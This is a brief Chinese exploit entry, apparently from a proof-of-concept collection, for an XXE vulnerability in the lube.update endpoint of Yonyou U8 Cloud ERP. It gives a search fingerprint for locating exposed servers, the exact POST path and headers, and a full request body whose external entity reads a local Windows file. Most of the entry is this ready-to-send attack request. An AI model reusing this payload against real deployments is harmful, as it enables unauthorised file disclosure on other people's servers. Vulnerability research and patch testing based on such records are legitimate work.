# 用友U8Cloudlube.update存在xxe漏洞

- **系统**：用友　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /hrss/dorado/lube.update.d?__rpc=true&__rpcAgent=true HTTP/1.1`
- **关键头**：`Content-Length: 450`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY test  SYSTEM "file:///c:/windows/win.ini" >]><rpc transaction="10" method="resetPwd"><def><dataset type="Custom" id="dsResetPwd"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r id="10008" state="insert"><n><v>1</v></n></r></rs></data><vps><p name="__profileKeys">%26test;</p></vps></rpc>&1404976068948

\[用友-U8C-Cloud-lube-update-XXE.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友U8 Cloud lube.update存在xxe漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud